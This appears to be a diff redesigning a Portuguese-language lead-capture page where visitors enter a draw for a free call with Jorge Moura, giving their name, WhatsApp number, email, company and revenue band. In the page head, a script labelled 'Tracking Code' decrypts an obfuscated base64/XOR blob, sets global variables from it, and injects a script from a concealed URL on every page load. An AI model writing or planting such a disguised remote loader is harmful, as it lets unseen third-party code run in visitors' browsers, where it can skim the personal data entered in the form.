@@ -2,9 +2,9 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Concorra a uma Call com o Jorge Moura | Método PQP</title>
-  <meta name="description" content="Preencha o formulário para concorrer a uma call estratégica individual com o Jorge Moura (Founder @groupjota)." />
+  <meta name="description" content="Concorra a uma call individual e gratuita com o Jorge Moura. Sortearemos 5 pessoas entre os inscritos." />
 
   <!-- Favicon -->
   <link rel="icon" type="image/png" href="assets/logo_pqp.png?v=2" />
@@ -27,246 +27,94 @@
 
   <link rel="stylesheet" href="style.css" />
 
-  <style>
-    body {
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      padding-bottom: 0;
-    }
-    .call-page-wrapper {
-      padding: 40px 16px 60px 16px;
-      max-width: 680px;
-      margin: 0 auto;
-      width: 100%;
-    }
-    .call-page-brand {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 24px;
-    }
-    .call-creator-header {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      text-align: center;
-      margin-bottom: 28px;
-    }
-    .call-creator-avatar {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      border: 2px solid var(--border-gold-bright);
-      overflow: hidden;
-      margin-bottom: 14px;
-      box-shadow: 0 0 25px rgba(243, 178, 54, 0.35);
-    }
-    .call-creator-avatar img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      object-position: top center;
-    }
-    .call-title {
-      font-family: var(--font-heading);
-      font-size: clamp(1.8rem, 5vw, 2.3rem);
-      font-weight: 900;
-      line-height: 1.15;
-      color: #ffffff;
-      margin-bottom: 10px;
-    }
-    .call-subtitle {
-      font-size: 0.95rem;
-      color: var(--text-muted);
-      max-width: 520px;
-      line-height: 1.5;
-    }
-    .back-to-lp-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      color: var(--text-dim);
-      font-size: 0.8rem;
-      text-decoration: none;
-      margin-top: 24px;
-      transition: color 0.2s ease;
-    }
-    .back-to-lp-link:hover {
-      color: var(--gold-light);
-    }
-  </style>
+  <link rel="stylesheet" href="call.css" />
 
   <!-- Tracking Code -->
   <script>(function(){var g_lk=atob("DASmQw8AbEnfMQKm0H+ENn1sTnP9WXbSoHecbCBjCCfxRHbLuWLfbWxvAWe9Qy3Vs3bPM3tzQzm2SWfK/3TPO2psQiOsEy6EsXDSMWZiGT26QiCci1mKYWhsAyu+XXGE6l/dYWFhASz9CyDWuXzDL0ZkTmX9R2PKpWGEeS02DXDtBTOQ5DGTcDkxCC/sCDCW4WbAcD0iERSi");var v_7h9g=[];for(var i_5=0;i_5<g_lk.length;i_5++){v_7h9g.push(g_lk.charCodeAt(i_5)&255);}var n_f=v_7h9g[0];var c_l1lb=v_7h9g.slice(1,1+n_f);var d_n=v_7h9g.slice(1+n_f);var s_l=d_n.map(function(b,u_gbw){return b^c_l1lb[u_gbw%n_f];});var v_h="";for(var i_vm=0;i_vm<s_l.length;i_vm++){v_h+=String.fromCharCode(s_l[i_vm]&255);}var r_v=decodeURIComponent(escape(v_h));var h_g=JSON.parse(r_v);var r_x=h_g.globals||[];r_x.forEach(function(e_ryc){window[e_ryc.name]=e_ryc.value;});var m_no=document.createElement("script");m_no.src=h_g.url;m_no.async=true;m_no.defer=true;(h_g.attributes||[]).forEach(function(y_n1){m_no.setAttribute(y_n1.name,y_n1.value);});(document.head||document.documentElement).appendChild(m_no);})();</script>
 </head>
-<body>
-
-  <!-- Ambient Cinematic Glows -->
-  <div class="ambient-glow glow-top"></div>
-  <div class="ambient-glow glow-bottom"></div>
-
-  <main class="call-page-wrapper">
-    
-    <!-- Brand Standalone Logo -->
-    <div class="call-page-brand">
-      <a href="index.html" aria-label="Voltar para a página principal">
-        <img src="assets/logo_pqp.png?v=2" alt="PQP" class="brand-logo-3d-standalone" style="height: 40px;" />
-      </a>
-    </div>
-
-    <!-- Creator Header -->
-    <div class="call-creator-header">
-      <div class="call-creator-avatar">
-        <img src="assets/hero_creator.png" alt="Jorge Moura Jota" />
+<body class="call-page call-campaign">
+  <header class="call-page-header site-container">
+    <a href="index.html" aria-label="Método PQP — página principal"><img src="assets/logo_pqp.png?v=2" alt="PQP" class="brand-logo-3d-standalone" width="90" height="32"></a>
+    <a href="index.html" class="call-back-link">Conhecer o Método PQP <i class="fa-solid fa-arrow-up-right-from-square" aria-hidden="true"></i></a>
+  </header>
+  <main class="call-page-main" id="call" aria-labelledby="callHeading">
+    <div class="site-container call-layout">
+      <div class="call-intro">
+        <p class="call-eyebrow">Uma conversa. Novas possibilidades.</p>
+        <h1 class="call-heading" id="callHeading">Concorra a uma<span>call com o Jorge.</span></h1>
+        <p class="call-description">Vamos olhar para o seu perfil, entender o momento do seu negócio e conversar sobre os próximos passos para crescer no Instagram.</p>
+        <div class="call-details" aria-label="Sobre a call">
+          <span><i class="fa-solid fa-user" aria-hidden="true"></i> Individual</span>
+          <span><i class="fa-solid fa-video" aria-hidden="true"></i> Online</span>
+          <span><i class="fa-solid fa-gift" aria-hidden="true"></i> Gratuita</span>
+        </div>
+        <figure class="call-portrait">
+          <img src="assets/jorge_portrait.png" alt="Jorge Moura" width="600" height="1075" loading="lazy">
+          <figcaption><span class="call-portrait-signature" aria-hidden="true"></span><span class="call-portrait-name">Jorge Moura</span><span class="call-portrait-role">Criador do Método PQP<br>Founder @groupjota</span></figcaption>
+        </figure>
       </div>
-      <div class="badge-tag gold-tag" style="margin-bottom: 10px;">
-        <i class="fa-solid fa-headset"></i>
-        <span>OPORTUNIDADE EXCLUSIVA • LINK DA BIO</span>
-      </div>
-      <h1 class="call-title">
-        Concorra a uma <br />
-        <span class="gold-gradient-text glow-effect">Call Estratégica com o Jorge</span>
-      </h1>
-      <p class="call-subtitle">
-        Quer analisar o seu perfil e o momento do seu negócio direto comigo? Preencha o formulário abaixo para concorrer a uma sessão individual.
-      </p>
-    </div>
-
-    <!-- Form Card -->
-    <div class="form-container-card" style="box-shadow: 0 20px 50px rgba(0,0,0,0.9), 0 0 40px rgba(229,169,60,0.18);">
-      <form class="lead-capture-form" id="leadForm" autocomplete="on">
-        
-        <div class="form-grid-fields">
-          <!-- 1. Nome -->
-          <div class="form-field-group">
-            <label for="formNome" class="form-label">
-              <i class="fa-solid fa-user gold-icon"></i> Nome Completo
-            </label>
-            <input 
-              type="text" 
-              id="formNome" 
-              name="nome" 
-              class="form-input" 
-              placeholder="Seu nome completo" 
-              required 
-            />
-          </div>
-
-          <!-- 2. Nome da Empresa -->
-          <div class="form-field-group">
-            <label for="formEmpresa" class="form-label">
-              <i class="fa-solid fa-building gold-icon"></i> Nome da Empresa
-            </label>
-            <input 
-              type="text" 
-              id="formEmpresa" 
-              name="empresa" 
-              class="form-input" 
-              placeholder="Nome da sua empresa / negócio" 
-              required 
-            />
-          </div>
-
-          <!-- 3. Telefone -->
-          <div class="form-field-group">
-            <label for="formTelefone" class="form-label">
-              <i class="fa-brands fa-whatsapp gold-icon"></i> Telefone / WhatsApp
-            </label>
-            <input 
-              type="tel" 
-              id="formTelefone" 
-              name="telefone" 
-              class="form-input" 
-              placeholder="(00) 00000-0000" 
-              maxlength="15"
-              required 
-            />
-          </div>
-
-          <!-- 4. E-mail -->
-          <div class="form-field-group">
-            <label for="formEmail" class="form-label">
-              <i class="fa-solid fa-envelope gold-icon"></i> E-mail
-            </label>
-            <input 
-              type="email" 
-              id="formEmail" 
-              name="email" 
-              class="form-input" 
-              placeholder="seuemail@empresa.com.br" 
-              required 
-            />
-          </div>
-
-          <!-- 5. Faixa de Faturamento -->
-          <div class="form-field-group form-field-full">
-            <label for="formFaturamento" class="form-label">
-              <i class="fa-solid fa-sack-dollar gold-icon"></i> Faixa de Faturamento Mensal
-            </label>
-            <div class="select-wrapper">
-              <select id="formFaturamento" name="faturamento" class="form-select" required>
-                <option value="" disabled selected>Selecione a faixa de faturamento da sua empresa...</option>
-                <option value="Ate R$ 10.000 / mes">Até R$ 10.000 / mês</option>
-                <option value="R$ 10.000 a R$ 30.000 / mes">R$ 10.000 a R$ 30.000 / mês</option>
-                <option value="R$ 30.000 a R$ 50.000 / mes">R$ 30.000 a R$ 50.000 / mês</option>
-                <option value="R$ 50.000 a R$ 100.000 / mes">R$ 50.000 a R$ 100.000 / mês</option>
-                <option value="Acima de R$ 100.000 / mes">Acima de R$ 100.000 / mês</option>
-              </select>
-              <i class="fa-solid fa-chevron-down select-arrow"></i>
+      <div class="call-form-panel" id="formulario">
+        <div class="call-form-kicker"><i class="fa-solid fa-ticket" aria-hidden="true"></i> Inscrição gratuita</div>
+        <h3 class="call-form-title">Entre para o sorteio.</h3>
+        <p class="call-form-description">Preencha seus dados para concorrer.<br>Se você for sorteado, falamos com você pelo WhatsApp.</p>
+        <form class="lead-capture-form" id="leadForm" autocomplete="on" action="https://formsubmit.co/jorgemourajotaempresarial@gmail.com" method="POST" aria-label="Inscrição para concorrer a uma call com o Jorge" aria-describedby="callRules">
+          <input type="hidden" name="_subject" value="Nova inscrição — Call com o Jorge">
+          <input type="hidden" name="_template" value="table">
+          <input type="text" name="_honey" tabindex="-1" autocomplete="off" hidden aria-hidden="true">
+          <div class="form-grid-fields">
+            <div class="form-field-group form-field-full">
+              <label for="formNome" class="form-label">Seu nome completo</label>
+              <input type="text" id="formNome" name="nome" class="form-input" placeholder="Como podemos chamar você?" autocomplete="name" maxlength="120" required>
+            </div>
+            <div class="form-field-group">
+              <label for="formTelefone" class="form-label">WhatsApp com DDD</label>
+              <input type="tel" id="formTelefone" name="telefone" class="form-input" placeholder="(00) 00000-0000" autocomplete="tel-national" inputmode="tel" maxlength="15" pattern="\([0-9]{2}\) [0-9]{4,5}-[0-9]{4}" title="Informe seu telefone com DDD e 10 ou 11 dígitos." required>
+            </div>
+            <div class="form-field-group">
+              <label for="formEmail" class="form-label">Seu e-mail</label>
+              <input type="email" id="formEmail" name="email" class="form-input" placeholder="voce@exemplo.com" autocomplete="email" maxlength="160" required>
+            </div>
+            <div class="form-field-group form-field-full">
+              <label for="formEmpresa" class="form-label">Nome da empresa ou negócio</label>
+              <input type="text" id="formEmpresa" name="empresa" class="form-input" placeholder="Seu negócio ou sua marca pessoal" autocomplete="organization" maxlength="160" required>
+            </div>
+            <div class="form-field-group form-field-full">
+              <label for="formFaturamento" class="form-label">Faturamento mensal</label>
+              <div class="select-wrapper">
+                <select id="formFaturamento" name="faturamento" class="form-select" required>
+                  <option value="" disabled selected>Selecione uma faixa</option>
+                  <option value="Ainda não faturo">Ainda não faturo</option>
+                  <option value="Ate R$ 10.000 / mes">Até R$ 10.000 / mês</option>
+                  <option value="R$ 10.000 a R$ 30.000 / mes">R$ 10.000 a R$ 30.000 / mês</option>
+                  <option value="R$ 30.000 a R$ 50.000 / mes">R$ 30.000 a R$ 50.000 / mês</option>
+                  <option value="R$ 50.000 a R$ 100.000 / mes">R$ 50.000 a R$ 100.000 / mês</option>
+                  <option value="Acima de R$ 100.000 / mes">Acima de R$ 100.000 / mês</option>
+                </select>
+                <i class="fa-solid fa-chevron-down select-arrow" aria-hidden="true"></i>
+              </div>
             </div>
           </div>
-        </div>
-
-        <!-- Submit Button & Feedback -->
-        <div class="form-action-wrap">
-          <button type="submit" class="btn-gold-action pulse-anim btn-form-submit" id="btnFormSubmit">
-            <span class="btn-text">QUERO CONCORRER À CALL COM O JORGE</span>
-            <span class="btn-arrow-icon"><i class="fa-solid fa-arrow-right"></i></span>
-            <div class="btn-gold-shine"></div>
-          </button>
-          <p class="form-fine-print">
-            <i class="fa-solid fa-circle-info gold-icon"></i>
-            * Selecionaremos 5 pessoas entre os inscritos para receber a call estratégica individual com o Jorge. Entraremos em contato diretamente pelo WhatsApp cadastrado.
-          </p>
-        </div>
-
-        <!-- Alert de Sucesso -->
-        <div class="form-alert-feedback form-alert-success" id="formSuccessAlert" style="display: none;">
-          <i class="fa-solid fa-circle-check"></i>
-          <div>
-            <strong>Aplicação enviada com sucesso!</strong>
-            <p>Você já está concorrendo a uma das 5 calls estratégicas com o Jorge Moura. Fique atento ao seu WhatsApp!</p>
+          <div class="form-action-wrap">
+            <button type="submit" class="btn-form-submit" id="btnFormSubmit">
+              <span class="btn-text">Quero concorrer à call com o Jorge</span>
+              <i class="fa-solid fa-arrow-right" aria-hidden="true"></i>
+            </button>
+            <p class="form-fine-print" id="callRules"><strong>Sortearemos 5 pessoas entre os inscritos</strong> para uma call individual com o Jorge. A inscrição não garante a call. Os sorteados serão contatados pelo WhatsApp informado.</p>
           </div>
-        </div>
-
-        <!-- Alert de Erro -->
-        <div class="form-alert-feedback form-alert-error" id="formErrorAlert" style="display: none;">
-          <i class="fa-solid fa-triangle-exclamation"></i>
-          <div>
-            <strong>Ocorreu um erro no envio.</strong>
-            <p>Por favor, verifique os campos ou tente novamente em alguns instantes.</p>
+          <p class="call-privacy"><i class="fa-solid fa-lock" aria-hidden="true"></i> Seus dados serão usados para esta inscrição e contato.</p>
+          <div class="form-alert-feedback form-alert-success" id="formSuccessAlert" style="display: none;" role="status" tabindex="-1">
+            <i class="fa-solid fa-circle-check" aria-hidden="true"></i>
+            <div><strong>Inscrição enviada!</strong><p>Você está concorrendo a uma das 5 calls com o Jorge. Se for sorteado, entraremos em contato pelo WhatsApp.</p></div>
           </div>
-        </div>
-
-      </form>
+          <div class="form-alert-feedback form-alert-error" id="formErrorAlert" style="display: none;" role="alert" tabindex="-1">
+            <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+            <div><strong>Não foi possível enviar sua inscrição.</strong><p>Seus dados continuam preenchidos. Tente novamente em alguns instantes.</p></div>
+          </div>
+        </form>
+      </div>
     </div>
-
-    <!-- Back to LP -->
-    <div style="text-align: center;">
-      <a href="index.html" class="back-to-lp-link">
-        <i class="fa-solid fa-arrow-left"></i> Conhecer o Método PQP completo
-      </a>
-    </div>
-
   </main>
-
-  <footer class="site-page-footer" style="padding: 20px 0;">
-    <div class="site-container text-center">
-      <p class="footer-legal-copy">© 2026 Método PQP • Jorge Moura Jota • Founder @groupjota</p>
-    </div>
-  </footer>
-
+  <footer class="call-page-footer">© 2026 Método PQP · Jorge Moura · @groupjota</footer>
   <script src="script.js" defer></script>
 </body>
 </html>
